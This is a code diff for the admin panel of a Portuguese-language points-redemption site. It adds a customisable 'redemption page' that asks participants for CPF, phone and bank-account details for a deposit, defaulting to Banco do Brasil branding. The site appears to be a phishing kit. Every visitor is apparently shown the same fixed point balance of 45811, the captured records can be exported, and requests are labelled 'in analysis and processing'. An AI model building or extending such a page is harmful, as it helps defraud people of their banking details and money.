@@ -8,6 +8,7 @@ import {
   EyeOff,
   FileSpreadsheet,
   KeyRound,
+  LayoutTemplate,
   Lock,
   LogOut,
   Palette,
@@ -16,7 +17,8 @@ import {
   Upload,
 } from 'lucide-react';
 import type { ConsultaAdminRecord, SiteSettings } from '../types';
-import { calculateConvertedBrl, formatBrl } from '../utils/points';
+import { CAMPAIGN_BRL_VALUE, calculateConvertedBrl, formatBrl } from '../utils/points';
+import { isValidHexColor } from '../utils/validation';
 import { BrandMark } from './BrandMark';
 
 interface AdminPanelProps {
@@ -28,7 +30,7 @@ interface AdminPanelProps {
   onNavigate: (path: string) => void;
 }
 
-type AdminTab = 'marca' | 'consultas' | 'seguranca';
+type AdminTab = 'marca' | 'resgate' | 'consultas' | 'seguranca';
 type StatusFilter = 'todas' | 'consultado' | 'troca_solicitada';
 
 function escapeCsvCell(value: string | number | null | undefined): string {
@@ -71,6 +73,27 @@ export function AdminPanel({
   const [logoFeedback, setLogoFeedback] = useState<{ type: 'ok' | 'err'; text: string } | null>(null);
   const fileInputRef = useRef<HTMLInputElement>(null);
 
+  // Redemption page customization state
+  const [platformName, setPlatformName] = useState(settings.redemptionPage.platformName);
+  const [companyName, setCompanyName] = useState(settings.redemptionPage.companyName);
+  const [backgroundColor, setBackgroundColor] = useState(settings.redemptionPage.backgroundColor);
+  const [rpTitle, setRpTitle] = useState(settings.redemptionPage.title);
+  const [rpSubtitle, setRpSubtitle] = useState(settings.redemptionPage.subtitle);
+  const [rpInfoText, setRpInfoText] = useState(settings.redemptionPage.infoText);
+  const [bankLabel, setBankLabel] = useState(settings.redemptionPage.bankLabel);
+  const [depositInstructions, setDepositInstructions] = useState(settings.redemptionPage.depositInstructions);
+  const [showAgencyDigit, setShowAgencyDigit] = useState(settings.redemptionPage.showAgencyDigit);
+  const [convertButtonText, setConvertButtonText] = useState(settings.redemptionPage.convertButtonText);
+  const [ownershipButtonText, setOwnershipButtonText] = useState(settings.redemptionPage.ownershipButtonText);
+  const [requestButtonText, setRequestButtonText] = useState(settings.redemptionPage.requestButtonText);
+  const [confirmButtonText, setConfirmButtonText] = useState(settings.redemptionPage.confirmButtonText);
+  const [savingRedemption, setSavingRedemption] = useState(false);
+  const [redemptionFeedback, setRedemptionFeedback] = useState<{ type: 'ok' | 'err'; text: string } | null>(null);
+  const [uploadingRedemptionLogo, setUploadingRedemptionLogo] = useState(false);
+  const [redemptionDragActive, setRedemptionDragActive] = useState(false);
+  const [redemptionLogoFeedback, setRedemptionLogoFeedback] = useState<{ type: 'ok' | 'err'; text: string } | null>(null);
+  const redemptionFileInputRef = useRef<HTMLInputElement>(null);
+
   // Consultas state
   const [consultas, setConsultas] = useState<ConsultaAdminRecord[]>([]);
   const [loadingConsultas, setLoadingConsultas] = useState(false);
@@ -93,6 +116,20 @@ export function AdminPanel({
     setPointsLabel(settings.pointsLabel);
     setMinPointsPreview(String(settings.minPointsPreview));
     setMaxPointsPreview(String(settings.maxPointsPreview));
+
+    setPlatformName(settings.redemptionPage.platformName);
+    setCompanyName(settings.redemptionPage.companyName);
+    setBackgroundColor(settings.redemptionPage.backgroundColor);
+    setRpTitle(settings.redemptionPage.title);
+    setRpSubtitle(settings.redemptionPage.subtitle);
+    setRpInfoText(settings.redemptionPage.infoText);
+    setBankLabel(settings.redemptionPage.bankLabel);
+    setDepositInstructions(settings.redemptionPage.depositInstructions);
+    setShowAgencyDigit(settings.redemptionPage.showAgencyDigit);
+    setConvertButtonText(settings.redemptionPage.convertButtonText);
+    setOwnershipButtonText(settings.redemptionPage.ownershipButtonText);
+    setRequestButtonText(settings.redemptionPage.requestButtonText);
+    setConfirmButtonText(settings.redemptionPage.confirmButtonText);
   }, [settings]);
 
   useEffect(() => {
@@ -180,8 +217,8 @@ export function AdminPanel({
           heroSubtitle: heroSubtitle.trim(),
           formHeading: formHeading.trim(),
           pointsLabel: pointsLabel.trim(),
-          minPointsPreview: Number(minPointsPreview) || 40000,
-          maxPointsPreview: Number(maxPointsPreview) || 80000,
+          minPointsPreview: Number(minPointsPreview) || 45811,
+          maxPointsPreview: Number(maxPointsPreview) || 45811,
         }),
       });
       if (response.status === 401) {
@@ -296,6 +333,158 @@ export function AdminPanel({
     }
   }
 
+  async function handleSaveRedemptionSettings(e: FormEvent): Promise<void> {
+    e.preventDefault();
+    if (!adminToken) return;
+    setRedemptionFeedback(null);
+
+    if (platformName.trim().length < 2) {
+      setRedemptionFeedback({ type: 'err', text: 'Informe o nome da plataforma (mínimo 2 caracteres).' });
+      return;
+    }
+    if (!isValidHexColor(backgroundColor.trim())) {
+      setRedemptionFeedback({ type: 'err', text: 'Informe uma cor de fundo hexadecimal válida (ex.: #FFED00).' });
+      return;
+    }
+
+    setSavingRedemption(true);
+    try {
+      const response = await fetch('/api/admin/settings', {
+        method: 'PUT',
+        headers: {
+          'Content-Type': 'application/json',
+          Authorization: `Bearer ${adminToken}`,
+        },
+        body: JSON.stringify({
+          redemptionPage: {
+            platformName: platformName.trim(),
+            companyName: companyName.trim(),
+            backgroundColor: backgroundColor.trim().toUpperCase(),
+            title: rpTitle.trim(),
+            subtitle: rpSubtitle.trim(),
+            infoText: rpInfoText.trim(),
+            bankLabel: bankLabel.trim(),
+            depositInstructions: depositInstructions.trim(),
+            showAgencyDigit,
+            convertButtonText: convertButtonText.trim(),
+            ownershipButtonText: ownershipButtonText.trim(),
+            requestButtonText: requestButtonText.trim(),
+            confirmButtonText: confirmButtonText.trim(),
+          },
+        }),
+      });
+      if (response.status === 401) {
+        onLogout();
+        return;
+      }
+      const data = (await response.json()) as SiteSettings & { error?: string };
+      if (!response.ok) {
+        setRedemptionFeedback({ type: 'err', text: data.error || 'Erro ao salvar personalização da página de resgate.' });
+        return;
+      }
+      onSettingsUpdated(data);
+      setRedemptionFeedback({ type: 'ok', text: 'Personalização da página de resgate salva e aplicada com sucesso.' });
+    } catch {
+      setRedemptionFeedback({ type: 'err', text: 'Erro de conexão ao salvar personalização.' });
+    } finally {
+      setSavingRedemption(false);
+    }
+  }
+
+  async function uploadRedemptionLogoFile(file: File): Promise<void> {
+    if (!adminToken) return;
+    setRedemptionLogoFeedback(null);
+
+    const allowed = ['image/png', 'image/jpeg', 'image/jpg', 'image/webp'];
+    if (!allowed.includes(file.type)) {
+      setRedemptionLogoFeedback({ type: 'err', text: 'Formato inválido. Selecione uma imagem PNG, JPG ou WEBP.' });
+      return;
+    }
+    if (file.size > 1.5 * 1024 * 1024) {
+      setRedemptionLogoFeedback({ type: 'err', text: 'A imagem deve ter no máximo 1,5 MB.' });
+      return;
+    }
+
+    setUploadingRedemptionLogo(true);
+    try {
+      const dataUrl = await new Promise<string>((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload = () => resolve(String(reader.result || ''));
+        reader.onerror = () => reject(new Error('Falha ao ler arquivo'));
+        reader.readAsDataURL(file);
+      });
+
+      const response = await fetch('/api/admin/redemption-logo', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          Authorization: `Bearer ${adminToken}`,
+        },
+        body: JSON.stringify({ dataUrl }),
+      });
+
+      if (response.status === 401) {
+        onLogout();
+        return;
+      }
+
+      const data = (await response.json()) as { settings?: SiteSettings; error?: string };
+      if (!response.ok) {
+        setRedemptionLogoFeedback({ type: 'err', text: data.error || 'Falha ao enviar a logo da plataforma.' });
+        return;
+      }
+
+      if (data.settings) onSettingsUpdated(data.settings);
+      setRedemptionLogoFeedback({ type: 'ok', text: 'Logo da página de resgate enviada e persistida.' });
+    } catch {
+      setRedemptionLogoFeedback({ type: 'err', text: 'Não foi possível enviar a imagem.' });
+    } finally {
+      setUploadingRedemptionLogo(false);
+      if (redemptionFileInputRef.current) {
+        redemptionFileInputRef.current.value = '';
+      }
+    }
+  }
+
+  function handleRedemptionFileChange(e: ChangeEvent<HTMLInputElement>): void {
+    const file = e.target.files?.[0];
+    if (file) void uploadRedemptionLogoFile(file);
+  }
+
+  function handleRedemptionDrop(e: DragEvent<HTMLDivElement>): void {
+    e.preventDefault();
+    setRedemptionDragActive(false);
+    const file = e.dataTransfer.files?.[0];
+    if (file) void uploadRedemptionLogoFile(file);
+  }
+
+  async function handleRemoveRedemptionLogo(): Promise<void> {
+    if (!adminToken) return;
+    setRedemptionLogoFeedback(null);
+    setUploadingRedemptionLogo(true);
+    try {
+      const response = await fetch('/api/admin/redemption-logo', {
+        method: 'DELETE',
+        headers: { Authorization: `Bearer ${adminToken}` },
+      });
+      if (response.status === 401) {
+        onLogout();
+        return;
+      }
+      const data = (await response.json()) as { settings?: SiteSettings; error?: string };
+      if (!response.ok) {
+        setRedemptionLogoFeedback({ type: 'err', text: data.error || 'Erro ao remover logo.' });
+        return;
+      }
+      if (data.settings) onSettingsUpdated(data.settings);
+      setRedemptionLogoFeedback({ type: 'ok', text: 'Logo exclusiva removida. Exibindo a logo principal ou iniciais.' });
+    } catch {
+      setRedemptionLogoFeedback({ type: 'err', text: 'Erro de conexão ao remover logo.' });
+    } finally {
+      setUploadingRedemptionLogo(false);
+    }
+  }
+
   async function handleDeleteConsulta(id: string): Promise<void> {
     if (!adminToken) return;
     setConsultasError(null);
@@ -328,23 +517,32 @@ export function AdminPanel({
     const headers = [
       'Protocolo',
       'Participante',
-      'Referência',
+      'CPF (Mascarado)',
+      'Telefone (Mascarado)',
       'Pontos',
       'Valor Equivalente',
       'Status',
-      'Modalidade',
+      'Banco',
+      'Agência (Mascarada)',
+      'Conta Corrente (Mascarada)',
       'Data Consulta',
     ];
     const rows = filteredConsultas.map((c) => {
-      const brl = calculateConvertedBrl(c.pointsAvailable, getRateLabelForRow(c));
+      const brl =
+        typeof c.amountBrl === 'number' && Number.isFinite(c.amountBrl)
+          ? c.amountBrl
+          : calculateConvertedBrl(c.pointsAvailable, getRateLabelForRow(c));
       return [
         escapeCsvCell(c.protocol),
         escapeCsvCell(c.profileLabel),
-        escapeCsvCell(c.referenceCode),
+        escapeCsvCell(c.cpfMasked || '***.***.***-**'),
+        escapeCsvCell(c.phoneMasked || '(**) *****-****'),
         escapeCsvCell(c.pointsAvailable),
         escapeCsvCell(formatBrl(brl)),
-        escapeCsvCell(c.status === 'troca_solicitada' ? 'Troca confirmada' : 'Consultado'),
-        escapeCsvCell(c.selectedOptionTitle || '-'),
+        escapeCsvCell(c.status === 'troca_solicitada' ? 'Em análise e processamento' : 'Consultado'),
+        escapeCsvCell(c.bankLabel || '-'),
+        escapeCsvCell(c.agencyMasked || '-'),
+        escapeCsvCell(c.accountMasked || '-'),
         escapeCsvCell(new Date(c.createdAt).toLocaleString('pt-BR')),
       ];
     });
@@ -501,6 +699,7 @@ export function AdminPanel({
     const q = searchQuery.toLowerCase().trim();
     return (
       item.profileLabel.toLowerCase().includes(q) ||
+      (item.cpfMasked || '').toLowerCase().includes(q) ||
       item.referenceCode.toLowerCase().includes(q) ||
       item.protocol.toLowerCase().includes(q)
     );
@@ -512,9 +711,13 @@ export function AdminPanel({
 
   const tabTitles: Record<AdminTab, string> = {
     marca: 'Identidade e Logo',
-    consultas: 'Consultas e Trocas',
+    resgate: 'Personalização da Página de Resgate',
+    consultas: 'Consultas e Resgates',
     seguranca: 'Segurança e Senha',
   };
+
+  const previewBgColor = isValidHexColor(backgroundColor.trim()) ? backgroundColor.trim() : '#FFED00';
+  const previewLogoUrl = settings.redemptionPage.redemptionLogoUrl || settings.brandLogoUrl;
 
   return (
     <div className="min-h-screen bg-neutral-50 text-[#151515] flex flex-col lg:flex-row">
@@ -540,6 +743,19 @@ export function AdminPanel({
           >
             <Palette className="w-4 h-4 shrink-0" aria-hidden="true" />
             <span>Nome e Logo</span>
+          </button>
+
+          <button
+            type="button"
+            onClick={() => setActiveTab('resgate')}
+            className={`flex items-center gap-2.5 px-3 py-2.5 rounded-lg text-sm font-medium whitespace-nowrap transition-colors cursor-pointer ${
+              activeTab === 'resgate'
+                ? 'bg-[#151515] text-white'
+                : 'text-neutral-600 hover:bg-neutral-100 hover:text-[#151515]'
+            }`}
+          >
+            <LayoutTemplate className="w-4 h-4 shrink-0" aria-hidden="true" />
+            <span>Página de Resgate</span>
           </button>
 
           <button
@@ -865,6 +1081,479 @@ export function AdminPanel({
             </div>
           )}
 
+          {/* TAB: PERSONALIZAÇÃO DA PÁGINA DE RESGATE */}
+          {activeTab === 'resgate' && (
+            <div className="space-y-8">
+              {/* Pré-visualização ao vivo */}
+              <section className="bg-white border border-neutral-200 rounded-xl p-6">
+                <div className="flex flex-wrap items-center justify-between gap-2 mb-3">
+                  <div>
+                    <h2 className="font-display text-lg font-bold text-[#151515]">
+                      PERSONALIZAÇÃO DA PÁGINA DE RESGATE
+                    </h2>
+                    <p className="text-xs text-neutral-500">
+                      Pré-visualização em tempo real da tela exibida após clicar em Solicitar Resgate.
+                    </p>
+                  </div>
+                  <span className="px-2.5 py-1 rounded bg-neutral-100 text-xs font-mono text-neutral-700">
+                    Fundo: {previewBgColor}
+                  </span>
+                </div>
+
+                <div
+                  className="rounded-xl border border-black/15 p-5 sm:p-6 transition-colors"
+                  style={{ backgroundColor: previewBgColor }}
+                >
+                  <div className="flex flex-wrap items-center justify-between gap-3 pb-4 border-b border-black/10">
+                    <div className="flex items-center gap-3">
+                      {previewLogoUrl ? (
+                        <img
+                          src={previewLogoUrl}
+                          alt={platformName || 'Logo da plataforma'}
+                          referrerPolicy="no-referrer"
+                          className="h-9 max-w-[140px] object-contain"
+                        />
+                      ) : (
+                        <div className="w-9 h-9 rounded-lg bg-[#151515] text-[#FFED00] flex items-center justify-center font-display font-bold text-sm">
+                          {(platformName || 'PL').slice(0, 2).toUpperCase()}
+                        </div>
+                      )}
+                      <div>
+                        <p className="font-display text-base font-bold text-[#151515] leading-tight">
+                          {platformName.trim() || 'Pontos Legais'}
+                        </p>
+                        {companyName.trim() && (
+                          <p className="text-[11px] font-medium text-[#151515]/75">
+                            {companyName.trim()}
+                          </p>
+                        )}
+                      </div>
+                    </div>
+
+                    <div className="bg-[#151515] text-white px-3.5 py-1.5 rounded-lg text-right">
+                      <span className="block text-[10px] uppercase tracking-wider text-white/70">
+                        Valor disponível
+                      </span>
+                      <span className="font-display text-sm font-bold text-[#FFED00] tabular-nums">
+                        {formatBrl(CAMPAIGN_BRL_VALUE)}
+                      </span>
+                    </div>
+                  </div>
+
+                  <div className="mt-5 bg-white rounded-xl border border-black/10 p-5 space-y-4">
+                    <div>
+                      <p className="text-xs font-semibold uppercase tracking-wide text-[#0038A8]">
+                        Olá, Participante Exemplo
+                      </p>
+                      <h3 className="font-display text-lg font-bold text-[#151515] mt-1">
+                        {rpTitle.trim() || 'Confirme seus dados para concluir sua solicitação de resgate.'}
+                      </h3>
+                      <p className="text-xs text-neutral-600 mt-1">
+                        {rpSubtitle.trim() || 'Informe os dados da conta corrente de sua titularidade para depósito.'}
+                      </p>
+                    </div>
+
+                    <div className="rounded-lg bg-neutral-50 border border-neutral-200 px-3.5 py-2.5 text-xs">
+                      <span className="text-neutral-500 block">Banco para depósito</span>
+                      <span className="font-semibold text-[#151515]">
+                        {bankLabel.trim() || 'Banco do Brasil — 001'}
+                      </span>
+                    </div>
+
+                    <div className={`grid gap-2.5 ${showAgencyDigit ? 'grid-cols-2 sm:grid-cols-4' : 'grid-cols-3'}`}>
+                      <div className="rounded-lg border border-neutral-200 px-3 py-2 text-xs text-neutral-400">
+                        Agência (0000)
+                      </div>
+                      {showAgencyDigit && (
+                        <div className="rounded-lg border border-neutral-200 px-3 py-2 text-xs text-neutral-400">
+                          Dígito (opcional)
+                        </div>
+                      )}
+                      <div className="rounded-lg border border-neutral-200 px-3 py-2 text-xs text-neutral-400">
+                        Conta corrente
+                      </div>
+                      <div className="rounded-lg border border-neutral-200 px-3 py-2 text-xs text-neutral-400">
+                        Dígito conta
+                      </div>
+                    </div>
+
+                    <p className="text-[11px] text-neutral-500 leading-relaxed">
+                      {rpInfoText.trim() || 'A solicitação será analisada e processada para a conta corrente informada.'}
+                    </p>
+
+                    <div className="w-full h-11 rounded-lg bg-[#0038A8] text-white font-display font-bold text-xs sm:text-sm flex items-center justify-center uppercase tracking-wide">
+                      {confirmButtonText.trim() || 'CONFIRMAR RESGATE'}
+                    </div>
+                  </div>
+                </div>
+              </section>
+
+              {/* Upload Logo da Plataforma */}
+              <section className="bg-white border border-neutral-200 rounded-xl p-6">
+                <h2 className="font-display text-lg font-bold text-[#151515] mb-1">
+                  Logo da plataforma na página de resgate
+                </h2>
+                <p className="text-sm text-neutral-600 mb-5">
+                  Envie uma logo exclusiva para o topo da página de resgate (PNG, JPG ou WEBP até 1,5 MB). Se não enviar, será usada a logo principal do site.
+                </p>
+
+                <div className="grid grid-cols-1 md:grid-cols-12 gap-6 items-center">
+                  <div
+                    className="md:col-span-4 flex flex-col items-center justify-center p-5 border border-black/15 rounded-lg min-h-[140px]"
+                    style={{ backgroundColor: previewBgColor }}
+                  >
+                    {settings.redemptionPage.redemptionLogoUrl ? (
+                      <img
+                        src={settings.redemptionPage.redemptionLogoUrl}
+                        alt="Logo da página de resgate"
+                        referrerPolicy="no-referrer"
+                        className="max-h-20 max-w-full object-contain"
+                      />
+                    ) : settings.brandLogoUrl ? (
+                      <div className="text-center space-y-2">
+                        <img
+                          src={settings.brandLogoUrl}
+                          alt="Logo principal (herdado)"
+                          referrerPolicy="no-referrer"
+                          className="max-h-14 max-w-full object-contain mx-auto opacity-85"
+                        />
+                        <p className="text-[11px] font-medium text-[#151515]">
+                          Usando logo principal do portal
+                        </p>
+                      </div>
+                    ) : (
+                      <p className="text-xs text-[#151515]/80 text-center font-medium">
+                        Nenhuma logo exclusiva enviada.
+                        <br />
+                        Exibindo iniciais da plataforma.
+                      </p>
+                    )}
+                  </div>
+
+                  <div className="md:col-span-8">
+                    <div
+                      onDragOver={(e) => {
+                        e.preventDefault();
+                        setRedemptionDragActive(true);
+                      }}
+                      onDragLeave={() => setRedemptionDragActive(false)}
+                      onDrop={handleRedemptionDrop}
+                      className={`border-2 border-dashed rounded-lg p-6 text-center transition-colors ${
+                        redemptionDragActive ? 'border-[#0038A8] bg-[#FFED00]/20' : 'border-neutral-300 bg-neutral-50/60'
+                      }`}
+                    >
+                      <input
+                        ref={redemptionFileInputRef}
+                        type="file"
+                        accept="image/png,image/jpeg,image/webp"
+                        onChange={handleRedemptionFileChange}
+                        className="hidden"
+                        id="redemption-logo-upload-input"
+                      />
+                      <Upload className="w-6 h-6 text-neutral-500 mx-auto mb-2" aria-hidden="true" />
+                      <p className="text-sm font-medium text-[#151515] mb-1">
+                        Arraste a logo da plataforma aqui ou clique para selecionar
+                      </p>
+                      <p className="text-xs text-neutral-500 mb-4">
+                        PNG, JPG ou WEBP · Máximo 1,5 MB
+                      </p>
+                      <div className="flex flex-wrap items-center justify-center gap-3">
+                        <button
+                          type="button"
+                          disabled={uploadingRedemptionLogo}
+                          onClick={() => redemptionFileInputRef.current?.click()}
+                          className="px-4 py-2 bg-[#151515] hover:bg-neutral-800 disabled:bg-neutral-400 text-white text-xs sm:text-sm font-semibold rounded-lg transition-colors cursor-pointer"
+                        >
+                          {uploadingRedemptionLogo ? 'Enviando...' : 'Subir logo da plataforma'}
+                        </button>
+                        {settings.redemptionPage.redemptionLogoUrl && (
+                          <button
+                            type="button"
+                            disabled={uploadingRedemptionLogo}
+                            onClick={handleRemoveRedemptionLogo}
+                            className="px-4 py-2 bg-white border border-neutral-300 hover:bg-red-50 hover:border-red-300 hover:text-red-700 text-neutral-700 text-xs sm:text-sm font-medium rounded-lg transition-colors cursor-pointer"
+                          >
+                            Remover logo exclusiva
+                          </button>
+                        )}
+                      </div>
+                    </div>
+
+                    {redemptionLogoFeedback && (
+                      <div
+                        role="status"
+                        className={`mt-3 p-3 rounded-lg border text-xs sm:text-sm flex items-center gap-2 ${
+                          redemptionLogoFeedback.type === 'ok'
+                            ? 'bg-emerald-50 border-emerald-200 text-emerald-800'
+                            : 'bg-red-50 border-red-200 text-red-800'
+                        }`}
+                      >
+                        {redemptionLogoFeedback.type === 'ok' ? (
+                          <CheckCircle2 className="w-4 h-4 shrink-0" />
+                        ) : (
+                          <AlertCircle className="w-4 h-4 shrink-0" />
+                        )}
+                        <span>{redemptionLogoFeedback.text}</span>
+                      </div>
+                    )}
+                  </div>
+                </div>
+              </section>
+
+              {/* Configurações de Marca, Cores, Textos e Botões */}
+              <section className="bg-white border border-neutral-200 rounded-xl p-6">
+                <h2 className="font-display text-lg font-bold text-[#151515] mb-1">
+                  Identidade, cores, textos e botões
+                </h2>
+                <p className="text-sm text-neutral-600 mb-6">
+                  Personalize o nome da plataforma, cor de fundo amarela, textos de orientação e rótulos dos botões principais.
+                </p>
+
+                <form onSubmit={handleSaveRedemptionSettings} className="space-y-5">
+                  <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
+                    <div>
+                      <label htmlFor="rp-platformName" className="block text-sm font-medium text-[#151515] mb-1.5">
+                        Nome da plataforma
+                      </label>
+                      <input
+                        id="rp-platformName"
+                        type="text"
+                        required
+                        maxLength={60}
+                        value={platformName}
+                        onChange={(e) => setPlatformName(e.target.value)}
+                        className="w-full h-11 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C]"
+                      />
+                    </div>
+
+                    <div>
+                      <label htmlFor="rp-companyName" className="block text-sm font-medium text-[#151515] mb-1.5">
+                        Nome da empresa / programa
+                      </label>
+                      <input
+                        id="rp-companyName"
+                        type="text"
+                        maxLength={80}
+                        value={companyName}
+                        onChange={(e) => setCompanyName(e.target.value)}
+                        className="w-full h-11 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C]"
+                      />
+                    </div>
+
+                    <div>
+                      <label htmlFor="rp-bgColor" className="block text-sm font-medium text-[#151515] mb-1.5">
+                        Cor de fundo da página
+                      </label>
+                      <div className="flex items-center gap-2">
+                        <input
+                          type="color"
+                          aria-label="Selecionar cor de fundo"
+                          value={previewBgColor}
+                          onChange={(e) => setBackgroundColor(e.target.value.toUpperCase())}
+                          className="w-11 h-11 p-1 rounded-lg border border-neutral-300 bg-white cursor-pointer shrink-0"
+                        />
+                        <input
+                          id="rp-bgColor"
+                          type="text"
+                          maxLength={7}
+                          value={backgroundColor}
+                          onChange={(e) => setBackgroundColor(e.target.value)}
+                          placeholder="#FFED00"
+                          className="w-full h-11 px-3 rounded-lg bg-white border border-neutral-300 text-sm font-mono uppercase text-[#151515] focus:outline-none focus:border-[#FE0A8C]"
+                        />
+                        <button
+                          type="button"
+                          onClick={() => setBackgroundColor('#FFED00')}
+                          className="px-2.5 h-11 text-xs font-medium text-neutral-600 hover:text-[#151515] border border-neutral-300 rounded-lg whitespace-nowrap cursor-pointer"
+                        >
+                          Padrão
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
+                    <div>
+                      <label htmlFor="rp-title" className="block text-sm font-medium text-[#151515] mb-1.5">
+                        Título principal da página de resgate
+                      </label>
+                      <input
+                        id="rp-title"
+                        type="text"
+                        required
+                        maxLength={140}
+                        value={rpTitle}
+                        onChange={(e) => setRpTitle(e.target.value)}
+                        className="w-full h-11 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C]"
+                      />
+                    </div>
+
+                    <div>
+                      <label htmlFor="rp-bankLabel" className="block text-sm font-medium text-[#151515] mb-1.5">
+                        Banco exibido para depósito
+                      </label>
+                      <input
+                        id="rp-bankLabel"
+                        type="text"
+                        required
+                        maxLength={80}
+                        value={bankLabel}
+                        onChange={(e) => setBankLabel(e.target.value)}
+                        className="w-full h-11 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C]"
+                      />
+                    </div>
+                  </div>
+
+                  <div>
+                    <label htmlFor="rp-subtitle" className="block text-sm font-medium text-[#151515] mb-1.5">
+                      Subtítulo da página de resgate
+                    </label>
+                    <input
+                      id="rp-subtitle"
+                      type="text"
+                      maxLength={240}
+                      value={rpSubtitle}
+                      onChange={(e) => setRpSubtitle(e.target.value)}
+                      className="w-full h-11 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C]"
+                    />
+                  </div>
+
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
+                    <div>
+                      <label htmlFor="rp-depositInstructions" className="block text-sm font-medium text-[#151515] mb-1.5">
+                        Instruções dos campos bancários
+                      </label>
+                      <textarea
+                        id="rp-depositInstructions"
+                        rows={3}
+                        maxLength={320}
+                        value={depositInstructions}
+                        onChange={(e) => setDepositInstructions(e.target.value)}
+                        className="w-full p-3.5 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C]"
+                      />
+                    </div>
+
+                    <div>
+                      <label htmlFor="rp-infoText" className="block text-sm font-medium text-[#151515] mb-1.5">
+                        Texto informativo de segurança
+                      </label>
+                      <textarea
+                        id="rp-infoText"
+                        rows={3}
+                        maxLength={400}
+                        value={rpInfoText}
+                        onChange={(e) => setRpInfoText(e.target.value)}
+                        className="w-full p-3.5 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C]"
+                      />
+                    </div>
+                  </div>
+
+                  <div className="pt-2 border-t border-neutral-200">
+                    <p className="text-sm font-semibold text-[#151515] mb-3">
+                      Rótulos dos botões de ação
+                    </p>
+                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                      <div>
+                        <label htmlFor="rp-btn-convert" className="block text-xs font-medium text-neutral-600 mb-1">
+                          Botão na tela de resultado
+                        </label>
+                        <input
+                          id="rp-btn-convert"
+                          type="text"
+                          required
+                          maxLength={60}
+                          value={convertButtonText}
+                          onChange={(e) => setConvertButtonText(e.target.value)}
+                          className="w-full h-10 px-3 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C]"
+                        />
+                      </div>
+                      <div>
+                        <label htmlFor="rp-btn-ownership" className="block text-xs font-medium text-neutral-600 mb-1">
+                          Botão de confirmação de titularidade
+                        </label>
+                        <input
+                          id="rp-btn-ownership"
+                          type="text"
+                          required
+                          maxLength={60}
+                          value={ownershipButtonText}
+                          onChange={(e) => setOwnershipButtonText(e.target.value)}
+                          className="w-full h-10 px-3 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C]"
+                        />
+                      </div>
+                      <div>
+                        <label htmlFor="rp-btn-request" className="block text-xs font-medium text-neutral-600 mb-1">
+                          Botão após confirmar titularidade
+                        </label>
+                        <input
+                          id="rp-btn-request"
+                          type="text"
+                          required
+                          maxLength={60}
+                          value={requestButtonText}
+                          onChange={(e) => setRequestButtonText(e.target.value)}
+                          className="w-full h-10 px-3 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C]"
+                        />
+                      </div>
+                      <div>
+                        <label htmlFor="rp-btn-confirm" className="block text-xs font-medium text-neutral-600 mb-1">
+                          Botão final na página de resgate
+                        </label>
+                        <input
+                          id="rp-btn-confirm"
+                          type="text"
+                          required
+                          maxLength={60}
+                          value={confirmButtonText}
+                          onChange={(e) => setConfirmButtonText(e.target.value)}
+                          className="w-full h-10 px-3 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C]"
+                        />
+                      </div>
+                    </div>
+                  </div>
+
+                  <label className="flex items-center gap-2.5 text-sm text-neutral-700 cursor-pointer pt-1">
+                    <input
+                      type="checkbox"
+                      checked={showAgencyDigit}
+                      onChange={(e) => setShowAgencyDigit(e.target.checked)}
+                      className="w-4 h-4 rounded border-neutral-300 accent-[#0038A8]"
+                    />
+                    <span>Exibir campo opcional de dígito da agência no formulário de depósito</span>
+                  </label>
+
+                  {redemptionFeedback && (
+                    <div
+                      role="status"
+                      className={`p-3 rounded-lg border text-xs sm:text-sm flex items-center gap-2 ${
+                        redemptionFeedback.type === 'ok'
+                          ? 'bg-emerald-50 border-emerald-200 text-emerald-800'
+                          : 'bg-red-50 border-red-200 text-red-800'
+                      }`}
+                    >
+                      {redemptionFeedback.type === 'ok' ? (
+                        <CheckCircle2 className="w-4 h-4 shrink-0" />
+                      ) : (
+                        <AlertCircle className="w-4 h-4 shrink-0" />
+                      )}
+                      <span>{redemptionFeedback.text}</span>
+                    </div>
+                  )}
+
+                  <div className="flex justify-end">
+                    <button
+                      type="submit"
+                      disabled={savingRedemption}
+                      className="h-11 px-6 bg-[#FE0A8C] hover:bg-[#DF067A] disabled:bg-[#FE0A8C]/60 text-white text-sm font-bold rounded-lg transition-colors cursor-pointer"
+                    >
+                      {savingRedemption ? 'Salvando...' : 'Salvar página de resgate'}
+                    </button>
+                  </div>
+                </form>
+              </section>
+            </div>
+          )}
+
           {/* TAB 2: CONSULTAS */}
           {activeTab === 'consultas' && (
             <div className="space-y-6">
@@ -877,7 +1566,7 @@ export function AdminPanel({
                   </p>
                 </div>
                 <div className="bg-white border border-neutral-200 rounded-xl p-5">
-                  <p className="text-xs font-medium text-neutral-500 mb-1">Trocas confirmadas</p>
+                  <p className="text-xs font-medium text-neutral-500 mb-1">Solicitações de resgate</p>
                   <p className="font-display text-2xl font-bold text-[#C8006B] tabular-nums">
                     {totalTrocas.toLocaleString('pt-BR')}
                   </p>
@@ -899,7 +1588,7 @@ export function AdminPanel({
                       type="text"
                       value={searchQuery}
                       onChange={(e) => setSearchQuery(e.target.value)}
-                      placeholder="Buscar por participante, referência ou protocolo..."
+                      placeholder="Buscar por participante, CPF ou protocolo..."
